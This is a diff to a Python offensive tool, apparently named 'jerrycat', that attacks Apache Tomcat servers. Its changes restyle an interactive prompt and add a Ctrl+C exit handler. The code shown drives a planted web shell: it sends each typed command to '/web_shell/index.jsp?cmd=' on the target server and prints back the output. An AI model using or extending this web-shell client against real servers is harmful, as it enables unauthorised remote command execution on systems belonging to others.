@@ -1,5 +1,5 @@
 import argparse
-import base64
+import signal
 import re
 import subprocess
 import sys
@@ -11,6 +11,7 @@ from packaging.version import Version
 from bs4 import BeautifulSoup
 
 from rich.console import Console
+from rich import print
 from rich.text import Text
 
 console = Console()
@@ -106,6 +107,10 @@ class output_class:
                 text.append(f"[!] ", style="orange_red1")
             case "ongoing":
                 text.append(f"[*] ", style="dodger_blue2")
+            case "exit":
+                text.append("[")
+                text.append("EXITING", style="red1")
+                text.append("] ")
 
         text.append(self.description)
         console.print(text)
@@ -200,17 +205,25 @@ class authenticated_attack(tomcat):
         self.execute_webshell_cmd(cmd=cmd)
 
         while cmd != "exit":
-            cmd = input("jerrycat > ")
-            self.execute_webshell_cmd(cmd=cmd)
+            print("[bold red]Jerrycat[/] > ", end="")
+            cmd = input()
+
+            if cmd != "":
+                print(self.execute_webshell_cmd(cmd=cmd))
+
     def execute_webshell_cmd(self, cmd: str):
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
         soup = BeautifulSoup(response.text, 'html.parser')
         content = soup.find_all('pre')
 
-        print(content[0].text)
+        return content[0].text
+
 
 def main():
     global output, args
+
+    # listen for CTRL+C
+    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(output.message(state="exit", description="See you next time!", clear_before=True)))
 
     parser = argparse.ArgumentParser(description="jerrycat the good guy !")
     group = parser.add_mutually_exclusive_group()
